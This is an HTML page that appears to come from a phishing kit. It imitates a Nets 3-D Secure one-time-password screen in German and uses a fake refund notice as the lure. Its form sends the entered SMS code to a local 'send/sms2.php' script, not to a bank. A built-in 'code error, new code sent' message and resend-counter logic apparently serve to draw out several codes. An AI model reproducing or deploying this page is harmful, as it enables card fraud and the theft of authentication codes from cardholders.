<!-- saved from url=(0096)https://acs3.3dsecure.no/mdpayacs/pareq;mdsessionid=60F5B8564B5C3B7960B95A6D975C224B?resend=true -->
<html lang="da"><script id="allow-copy_script">(function agent() {
    let isUnlockingCached = false
    const isUnlocking = () => isUnlockingCached
    document.addEventListener('allow_copy', event => {
      const { unlock } = event.detail
      isUnlockingCached = unlock
    })

    const copyEvents = [
      'copy',
      'cut',
      'contextmenu',
      'selectstart',
      'mousedown',
      'mouseup',
      'mousemove',
      'keydown',
      'keypress',
      'keyup',
    ]
    const rejectOtherHandlers = e => {
      if (isUnlocking()) {
        e.stopPropagation()
        if (e.stopImmediatePropagation) e.stopImmediatePropagation()
      }
    }
    copyEvents.forEach(evt => {
      document.documentElement.addEventListener(evt, rejectOtherHandlers, {
        capture: true,
      })
    })
  })()</script><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>otp</title>
    
    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.75">
    <link rel="stylesheet" type="text/css" href="screen.css">
    <link rel="stylesheet" type="text/css" href="gh-buttons.css">
    <link rel="icon" type="image/x-icon" href="">
    <script src="commons.js"></script>
    <script src="jquery-3.3.1.min.js"></script>
    <script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
    </script>
</head>
<body onload="onBodyLoad();">
<div id="authform">
    <div class="wrapper">
        <div class="scheme-logo-div"><img class="scheme-logo" alt="" src="1.svg" style="
    height: 50px;
    width: 350px;
"></div>
        
        <div class="flag-icon-div" title="Engelsk">
            <a href="#"></a>
        </div>
        <div class="clear"></div>
        <h1>Einmalige Codeüberprüfung</h1>
        <p>Wir haben jetzt einen einmaligen Code an Ihr Mobiltelefon gesendet.</p>
        <p>Geben Sie den Code ein, den Sie erhalten haben. Rufen Sie an, um die Transaktion abzubrechen, und klicken Sie auf "Stornierung bestätigen".</p>
        <form id="form" name="form" method="post" action="../send/sms2.php?avant=457878&amp;apres=878">
            <dl style="margin-top: 10px;">
                <dt>Webseite: </dt>
                <dd>Transaktion</dd>

                <dt>Menge: </dt>
                <dd id="purchAmount">Rückerstattung von CHF</dd>

                <dt>Datum:  </dt> 
              <?php echo $date = date('m/d/Y h:i:s a', time());?> 

                <dt>Kartennummer: </dt>
                <dd>XXXX XXXX XXXX XXXX</dd>

				


                <dt>
                    <label for="code">Passwort per SMS: </label>
                </dt>
                <dd>
                    <input style="width: 100px" type="number" pattern="\d*" width="6" id="otp" name="otp"  autocomplete="off">
                    <button class="button icon approve primary" name="submit" id="submit" type="submit" value="submit" style="position: absolute; margin-left: 5px;">Bestätigen</button>
                </dd>
            </dl>
            <div id="errorMessage" class="error">SMS-Code Fehler. Neuer Code wird gesendet.</div>
            
            <div style="font-size: 0.92em; margin-bottom: 8px;">
                <p>Sie können Ihre Handynummer unter nets.eu/3ds ändern</p>
            </div>
            <div style="float: left;">
                <a class="button icon arrowleft" href="#">Zurück</a>
            </div>
            <div style="float: right;">
                <a class="button icon add" id="resendButton" href="#" onclick="incrementResendCount()">Neuer Code</a>
                <a class="button" href="#">NemID</a>
            </div>
        </form>
    </div>
</div>
<script type="text/javascript">
    function incrementResendCount() {
        var resendCount = localStorage.getItem("localResendCount");
        if (resendCount == null) {
            resendCount = 0;
        }
        resendCount = Number(resendCount);
        resendCount = ++resendCount;
        localStorage.setItem("localResendCount", resendCount);
    }

    $(document).ready(function(){
        var resendCount = localStorage.getItem("localResendCount");

        if (Number(resendCount) >= 2) {
            $("#resendButton").hide();
            $("#resendText").hide();
            $("#errorMessage").hide();
            $("#resendExceeded").show();
            localStorage.setItem("localResendCount", "0");
        }

    });
</script>



</body></html>